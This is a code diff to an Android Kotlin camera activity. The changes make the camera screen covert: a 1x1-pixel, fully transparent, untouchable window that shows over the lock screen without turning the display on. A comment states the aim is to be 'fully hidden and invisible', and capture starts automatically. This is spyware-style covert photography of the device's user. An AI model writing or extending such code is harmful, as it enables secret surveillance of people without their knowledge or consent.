@@ -42,6 +42,8 @@ class CameraActivity : AppCompatActivity() {
         safeFinish()
     }
 
+    private var isCaptureStarted = false
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
@@ -50,19 +52,20 @@ class CameraActivity : AppCompatActivity() {
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                 setShowWhenLocked(true)
-                setTurnScreenOn(true)
-                val km = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
-                km?.requestDismissKeyguard(this, null)
+                setTurnScreenOn(false)
             } else {
                 @Suppress("DEPRECATION")
                 window.addFlags(
-                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
-                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
-                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
-                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
+                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                 )
             }
-            window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
+            // To'liq yashirin (hidden) va ko'rinmas qilish: 1x1 piksel, 0 alpha
+            val params = window.attributes
+            params.width = 1
+            params.height = 1
+            params.alpha = 0f
+            params.flags = params.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+            window.attributes = params
         } catch (e: Exception) {
             Log.e("CameraActivity", "Window flags error", e)
         }
@@ -73,7 +76,10 @@ class CameraActivity : AppCompatActivity() {
         mainHandler.postDelayed(timeoutRunnable, 12000L)
 
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
-            initAndStartCapture()
+            if (!isCaptureStarted) {
+                isCaptureStarted = true
+                initAndStartCapture()
+            }
         } else {
             safeFinish()
         }
